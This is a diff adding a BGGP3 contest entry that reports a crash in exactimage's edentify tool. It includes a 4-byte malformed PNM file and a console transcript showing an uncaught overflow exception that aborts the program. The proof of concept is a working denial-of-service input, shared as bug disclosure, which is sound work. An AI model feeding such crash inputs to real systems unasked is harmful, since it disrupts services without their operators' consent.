@@ -1,0 +1,55 @@
+---BEGIN BGGP3 ENTRY---
+
+Name or handle: teck
+
+Website, twitter, other online presence: @tecknicaltom on Twitter
+
+Target Software and Version: exactimage 1.0.2, edentify frontend
+
+Description of Target Software's Environment (Platform/OS, Setup Instructions, etc.): affected version of exactimage is the default version packaged for Ubuntu 22.04, versioned as 1.0.2-8build3
+
+Target File Type: malformed PNM image
+
+SHA256 Hash: 791e6cc5abd35e249a2ef7a4e2f0ed7da5b5a230e1321f9ac266e99622d1cbb5
+
+Brief Description of Crash: edentify is meant to be similar to ImageMagick's midentify program for reading metadata about given image files. edentify interprets the malformed file as a PNM file with width and height of -8 pixels. When loading the file data, the negative width creates an overflow, which is detected but results in an exception that is never caught, killing the program with SIGABRT.
+
+Was this a new crash, or a known bug? Looks to be a new crash, as the trunk svn version appears to be affected, but unknown for sure as the author does not appear to maintain a public issue tracker.
+
+Link to PoC video, screenshot, or console output, if any:
+
+    docker run -it --rm ubuntu:22.04
+
+root@d27d16219806:/# apt-get update >/dev/null && apt-get install -y exactimage xxd >/dev/null 2>&1
+root@d27d16219806:/# edentify
+ExactImage identification (edentify), version 1.0.2
+Copyright (C) 2006 - 2017 René Rebe, ExactCODE GmbH
+Copyright (C) 2006 Archivista GmbH
+Usage:
+-d, --decompress
+decompression method for reading images e.g. thumb
+depending on the input format, allowing to read partial data
+-f, --format
+user defined format string
+-h, --help
+display this help text and exit
+-v, --verbose
+more verbose output
+root@d27d16219806:/# echo -n 'P3-8' > /tmp/file
+root@d27d16219806:/# xxd /tmp/file
+00000000: 5033 2d38 P3-8
+root@d27d16219806:/# edentify /tmp/file
+terminate called after throwing an instance of 'std::overflow_error'
+what(): stride overflow
+Aborted (core dumped)
+
+Link to writeup, if any:
+Crash was found via fuzzing with honggfuzz using a variety of image files for the initial corpus.
+
+CVE or other acknowledgement, if any: N/A
+
+File contents (base64 encoded please):
+UDMtOA==
+
+---END BGGP3 ENTRY---
+
